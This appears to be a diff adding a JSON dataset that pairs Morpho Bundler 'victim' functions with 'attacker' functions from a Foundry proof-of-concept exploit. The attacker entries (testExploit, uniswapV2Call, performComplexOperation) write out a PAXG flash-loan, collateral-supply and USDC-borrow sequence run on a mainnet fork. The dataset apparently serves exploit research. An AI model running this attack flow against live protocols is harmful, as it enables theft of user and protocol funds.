+    "original_code": "    function onMorphoFlashLoan(uint256, bytes calldata data) external {\n        // Don't need to approve Morpho to pull tokens because it should already be approved max.\n        _callback(data);\n    }\n\n    /* ACTIONS */\n\n    /// @notice Approves `authorization.authorized` to manage `authorization.authorizer`'s position via EIP712\n    /// `signature`.\n    /// @param authorization The `Authorization` struct.\n    /// @param signature The signature.\n    /// @param skipRevert Whether to avoid reverting the call in case the signature is frontrunned.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "onMorphoRepay",
+    "original_code": "    function onMorphoRepay(uint256, bytes calldata data) external {\n        // Don't need to approve Morpho to pull tokens because it should already be approved max.\n        _callback(data);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "onMorphoSupply",
+    "original_code": "    function onMorphoSupply(uint256, bytes calldata data) external {\n        // Don't need to approve Morpho to pull tokens because it should already be approved max.\n        _callback(data);\n    }\n\n    function onMorphoSupplyCollateral(uint256, bytes calldata data) external {\n        // Don't need to approve Morpho to pull tokens because it should already be approved max.\n        _callback(data);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "onMorphoSupplyCollateral",
+    "original_code": "    function onMorphoSupplyCollateral(uint256, bytes calldata data) external {\n        // Don't need to approve Morpho to pull tokens because it should already be approved max.\n        _callback(data);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "permit",
+    "original_code": "    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {\n        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0) && recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');\n        _approve(owner, spender, value);\n    }\n}\n\n// File: contracts/libraries/Math.sol\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "permitDai",
+    "original_code": "    function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert)\n        external\n        payable\n        protected\n    {\n        try IDaiPermit(MainnetLib.DAI).permit(initiator(), address(this), nonce, expiry, allowed, v, r, s) {}\n        catch (bytes memory returnData) {\n            if (!skipRevert) _revert(returnData);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "reallocateTo",
+    "original_code": "    function reallocateTo(\n        address publicAllocator,\n        address vault,\n        uint256 value,\n        Withdrawal[] calldata withdrawals,\n        MarketParams calldata supplyMarketParams\n    ) external payable protected {\n        IPublicAllocator(publicAllocator).reallocateTo{value: value}(vault, withdrawals, supplyMarketParams);\n    }\n\n    /* INTERNAL */\n\n    /// @dev Triggers `_multicall` logic during a callback.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "stakeEth",
+    "original_code": "    function stakeEth(uint256 amount, uint256 minShares, address referral) external payable protected {\n        uint256 initialAmount = amount;\n        amount = Math.min(amount, address(this).balance);\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        uint256 shares = IStEth(ST_ETH).submit{value: amount}(referral);\n        require(shares * initialAmount >= minShares * amount, ErrorsLib.SLIPPAGE_EXCEEDED);\n    }\n\n    /// @notice Wraps the given `amount` of stETH to wstETH.\n    /// @notice wstETH tokens are received by the bundler and should be used afterwards.\n    /// @dev Initiator must have previously transferred their stETH tokens to the bundler.\n    /// @param amount The amount of stEth to wrap. Capped at the bundler's stETH balance.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom2",
+    "original_code": "    function transferFrom2(address asset, uint256 amount) external payable protected {\n        address _initiator = initiator();\n        amount = Math.min(amount, ERC20(asset).balanceOf(_initiator));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        Permit2Lib.PERMIT2.transferFrom(_initiator, address(this), amount.toUint160(), asset);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "unwrapNative",
+    "original_code": "    function unwrapNative(uint256 amount) external payable protected {\n        amount = Math.min(amount, ERC20(WRAPPED_NATIVE).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWNative(WRAPPED_NATIVE).withdraw(amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "unwrapStEth",
+    "original_code": "    function unwrapStEth(uint256 amount) external payable protected {\n        amount = Math.min(amount, ERC20(WST_ETH).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWstEth(WST_ETH).unwrap(amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "urdClaim",
+    "original_code": "    function urdClaim(\n        address distributor,\n        address account,\n        address reward,\n        uint256 amount,\n        bytes32[] calldata proof,\n        bool skipRevert\n    ) external payable protected {\n        require(account != address(0), ErrorsLib.ZERO_ADDRESS);\n        require(account != address(this), ErrorsLib.BUNDLER_ADDRESS);\n\n        try IUniversalRewardsDistributor(distributor).claim(account, reward, amount, proof) {}\n        catch (bytes memory returnData) {\n            if (!skipRevert) _revert(returnData);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "wrapNative",
+    "original_code": "    function wrapNative(uint256 amount) external payable protected {\n        amount = Math.min(amount, address(this).balance);\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWNative(WRAPPED_NATIVE).deposit{value: amount}();\n    }\n\n    /// @notice Unwraps the given `amount` of wNative to the native token.\n    /// @notice Unwrapped native tokens are received by the bundler and should be used afterwards.\n    /// @dev Initiator must have previously transferred their wrapped native tokens to the bundler.\n    /// @param amount The amount of wrapped native token to unwrap. Capped at the bundler's wNative balance.\n    function unwrapNative(uint256 amount) external payable protected {\n        amount = Math.min(amount, ERC20(WRAPPED_NATIVE).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWNative(WRAPPED_NATIVE).withdraw(amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IMorphoBundler",
+    "source_type": "victim_contract",
+    "function_name": "wrapStEth",
+    "original_code": "    function wrapStEth(uint256 amount) external payable protected {\n        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWstEth(WST_ETH).wrap(amount);\n    }\n\n    /// @notice Unwraps the given `amount` of wstETH to stETH.\n    /// @notice stETH tokens are received by the bundler and should be used afterwards.\n    /// @dev Initiator must have previously transferred their wstETH tokens to the bundler.\n    /// @param amount The amount of wstEth to unwrap. Capped at the bundler's wstETH balance.\n    function unwrapStEth(uint256 amount) external payable protected {\n        amount = Math.min(amount, ERC20(WST_ETH).balanceOf(address(this)));\n\n        require(amount != 0, ErrorsLib.ZERO_AMOUNT);\n\n        IWstEth(WST_ETH).unwrap(amount);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "BORROW_ASSETS",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "BORROW_SHARES",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "BORROW_SLIPPAGE_AMOUNT",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "FORK_BLOCK_NUMBER",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "MORPHO_BUNDLER",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "MORPHO_IRM",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "MORPHO_LTV",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "MORPHO_ORACLE",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "PAXG",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "PAXG_FLASHLOAN_AMOUNT",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "PAXG_USDC_V3_PAIR",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "PAXG_WETH_V2_PAIR",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "UNISWAP_V2_FEE_DENOMINATOR",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "UNISWAP_V2_FEE_NUMERATOR",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "USDC",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "USDC_SWAP_AMOUNT",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "bundler",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "performComplexOperation",
+    "original_code": "    function performComplexOperation(\n        address asset,\n        uint256 amount,\n        MarketParams memory marketParams,\n        address onBehalf,\n        address authorized,\n        uint256 borrowAssets,\n        uint256 borrowShares,\n        uint256 borrowSlippageAmount,\n        address borrowReceiver\n    ) public payable {\n        // Authorize Morpho Bundler\n        IMorpho(bundler.MORPHO()).setAuthorization(MORPHO_BUNDLER, true);\n\n        // Prepare multicall data\n        bytes[] memory calls = new bytes[](3);\n        calls[0] = abi.encodeWithSelector(IMorphoBundler.erc20TransferFrom.selector, asset, amount);\n        calls[1] =\n            abi.encodeWithSelector(IMorphoBundler.morphoSupplyCollateral.selector, marketParams, amount, onBehalf, \"\");\n        calls[2] = abi.encodeWithSelector(\n            IMorphoBundler.morphoBorrow.selector,\n            marketParams,\n            borrowAssets,\n            borrowShares,\n            borrowSlippageAmount,\n            borrowReceiver\n        );\n\n        // Execute the multicall\n        bundler.multicall{value: msg.value}(calls);\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        // Fork the mainnet at the specified block number\n        vm.createSelectFork(\"mainnet\", FORK_BLOCK_NUMBER);\n        // Set the funding token to USDC\n        fundingToken = USDC;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        // Initiate a flash loan of PAXG from the Uniswap V2 pair\n        IUniswapV2Pair(PAXG_WETH_V2_PAIR).swap(PAXG_FLASHLOAN_AMOUNT, 0, address(this), new bytes(100));\n        //At the end we swap any PAXG if remaining to USDC\n        uint256 paxgBal = TokenHelper.getTokenBalance(PAXG, address(this));\n        if (paxgBal > 0) _v3Swap(PAXG, USDC, paxgBal, address(this));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        // Ensure the caller is the correct Uniswap V2 pair\n        require(msg.sender == PAXG_WETH_V2_PAIR, \"Invalid caller\");\n\n        // Approve PAXG transfer to Morpho Bundler\n        require(TokenHelper.approveToken(PAXG, MORPHO_BUNDLER, amount0), \"Approval failed\");\n\n        // Perform operations with Morpho protocol\n        performComplexOperation(\n            PAXG,\n            PAXG_FLASHLOAN_AMOUNT,\n            MarketParams({\n                loanToken: USDC,\n                collateralToken: PAXG,\n                oracle: MORPHO_ORACLE,\n                irm: MORPHO_IRM,\n                lltv: MORPHO_LTV\n            }),\n            address(this),\n            MORPHO_BUNDLER,\n            BORROW_ASSETS,\n            BORROW_SHARES,\n            BORROW_SLIPPAGE_AMOUNT,\n            address(this)\n        );\n\n        // Swap USDC for PAXG to repay the flash loan\n        _v3Swap(USDC, PAXG, USDC_SWAP_AMOUNT, address(this));\n\n        // Calculate and repay the flash loan fee\n        uint256 fee = ((amount0 * UNISWAP_V2_FEE_NUMERATOR) / UNISWAP_V2_FEE_DENOMINATOR) + 1;\n        uint256 repayAmount = amount0 + fee;\n        TokenHelper.transferToken(PAXG, PAXG_WETH_V2_PAIR, repayAmount);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "MorphoBlue",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        // Ensure the caller is the correct Uniswap V3 pool\n        require(msg.sender == PAXG_USDC_V3_PAIR, \"Invalid caller\");\n\n        bool zeroForOne = data.length > 0;\n        address tokenOut = zeroForOne\n            ? IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0()\n            : IUniswapV3Pool(PAXG_USDC_V3_PAIR).token0() == USDC ? PAXG : USDC;\n\n        uint256 amountOut = uint256(zeroForOne ? amount0Delta : amount1Delta);\n\n        // Transfer the required amount to the pool\n        TokenHelper.transferToken(tokenOut, msg.sender, amountOut);\n    }\n",
+    "description": ""
+  }
+]
